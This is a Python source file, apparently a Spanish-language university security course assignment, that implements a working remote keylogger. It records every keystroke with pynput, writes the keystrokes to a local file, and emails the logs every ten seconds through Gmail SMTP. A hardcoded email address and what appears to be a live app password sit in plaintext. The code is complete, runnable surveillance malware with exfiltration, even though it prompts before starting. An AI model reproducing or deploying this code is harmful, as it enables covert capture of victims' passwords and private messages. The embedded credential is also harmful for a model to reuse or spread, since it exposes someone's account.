"""
Practica 6: Keylogger Remoto
Curso: Criptografía y Seguridad
Propósito: Demostrar el funcionamiento de un keylogger.
Uso: python3 keylogger.py
"""

import os
import threading
from datetime import datetime
from pynput import keyboard

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

log = ""  
email_log = ""  
EMAIL_INTERVAL = 10 
EMAIL_ADDRESS = "tomas.b.h@ciencias.unam.mx"
EMAIL_PASSWORD = "fovr dzuv hwhf cauc" 

def on_press(key):
    """
    Esta función se ejecuta cada vez que se presiona una tecla.
    Registra el evento en la variable global 'log'.
    """
    global log
    try:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n[ENTER]\n"
        elif key == keyboard.Key.backspace:
            log += "[BORRAR]"
        elif key == keyboard.Key.tab:
            log += "\t"
        else:
            char = str(key).replace("'", "")
            log += char
    except Exception as e:
        log += f"[{str(key).upper()}]"

def send_email():
    """
    Envía el contenido de 'email_log' al correo destinatario usando SMTP.
    """
    global email_log
    if not email_log:
        return

    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()  
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)

        msg = MIMEMultipart()
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS 
        msg["Subject"] = f"Reporte Keylogger - {datetime.now()}"

        body = f"Registro de teclas capturado:\n\n{email_log}"
        msg.attach(MIMEText(body, "plain"))

        server.send_message(msg)
        server.quit()
        print(f"[*] Correo enviado exitosamente a las {datetime.now()}")

        email_log = ""
    except Exception as e:
        print(f"[!] Error al enviar correo: {e}")


def save_to_file():
    """
    Guarda el log actual en un archivo de texto plano llamado 'output.txt'.
    """
    global log
    if not log:
        return
    try:
        with open("output.txt", "a", encoding="utf-8") as f:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"\n--- Log capturado: {timestamp} ---\n")
            f.write(log)
            f.write("\n--- Fin del log ---\n")
        print(f"[*] Registro guardado localmente en output.txt")
    except Exception as e:
        print(f"[!] Error al guardar archivo: {e}")


def schedule_emails():
    """
    Función que se ejecuta en un hilo separado para enviar correos cada cierto tiempo.
    """
    global email_log
    while True:
        threading.Event().wait(EMAIL_INTERVAL) 
        if email_log:
            print("[*] Enviando correo programado...")
            send_email()


def on_activate_exit():
    """
    Función que se ejecuta cuando se presiona la tecla de escape ('exit').
    """
    print("\n[!] Bandera 'exit' recibida. Deteniendo keylogger...")
    os._exit(0)  


def main():
    print("\n" + "="*50)
    print("   KEYLOGGER - Práctica 6 CyS")
    print("="*50)
    print("\nEste programa capturará las pulsaciones de teclado.")

    while True:
        respuesta_email = input("¿Deseas enviar los registros por email? (yes/y o no/n): ").lower()
        if respuesta_email in ['yes', 'y']:
            send_email_flag = True
            break
        elif respuesta_email in ['no', 'n']:
            send_email_flag = False
            break
        else:
            print("Respuesta no válida. Por favor responde 'yes'/'y' o 'no'/'n'.")

    while True:
        respuesta_file = input("¿Deseas guardar los registros en texto plano? (yes/y o no/n): ").lower()
        if respuesta_file in ['yes', 'y']:
            save_file_flag = True
            break
        elif respuesta_file in ['no', 'n']:
            save_file_flag = False
            break
        else:
            print("Respuesta no válida. Por favor responde 'yes'/'y' o 'no'/'n'.")

    if not send_email_flag and not save_file_flag:
        print("\n[!] No se seleccionó ninguna opción de registro. El programa se detendrá.")
        return

    print("\n[*] Keylogger iniciado...")
    print("[*] Presiona la combinación '<ctrl> + <c>' o escribe 'exit' para detener.")
    
    global email_log

    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    if send_email_flag:
        email_thread = threading.Thread(target=schedule_emails, daemon=True)
        email_thread.start()

    try:
        while True:
            import time
            time.sleep(5)
            if log:
                if save_file_flag:
                    save_to_file()
                if send_email_flag:
                    email_log += log  
    except KeyboardInterrupt:
        print("\n[*] Bandera 'exit' detectada. Limpiando y terminando...")
        if send_email_flag and email_log:
            send_email()
        print("[*] Keylogger detenido.")

if __name__ == "__main__":
    main()